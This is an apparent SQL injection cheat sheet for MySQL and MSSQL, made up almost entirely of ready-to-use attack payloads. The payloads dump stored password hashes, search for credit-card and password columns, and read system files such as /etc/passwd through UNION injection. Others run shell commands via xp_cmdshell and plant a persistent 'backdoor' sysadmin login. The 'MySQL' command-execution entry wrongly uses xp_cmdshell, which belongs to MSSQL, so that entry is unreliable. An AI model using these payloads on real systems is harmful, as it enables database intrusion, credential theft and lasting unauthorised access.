## Enumerate Database Users
    SELECT user,password FROM mysql.user;
    SELECT name,password_hash FROM sys.sql_logins;

  ## Find Sensitive Data
    SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit%';
    SELECT * FROM information_schema.columns WHERE column_name LIKE '%pass%';

  ## Reading Sensitive Files

    MySQL
    ' UNION SELECT LOAD_FILE('/etc/passwd')-- -

    MSSQL
    ' UNION SELECT * FROM OPENROWSET(BULK 'C:/windows/win.ini', SINGLE_CLOB) AS x-- -

  ## Command Execution
    MySQL
    '; EXEC xp_cmdshell 'whoami'-- -

    MSSQL
    '; EXEC xp_cmdshell 'whoami'-- -

  ## Establishing Persistence
    Create user admin
      ' UNION SELECT 'EXEC sp_addlogin ''backdoor'', ''password123''; EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin'';'-- -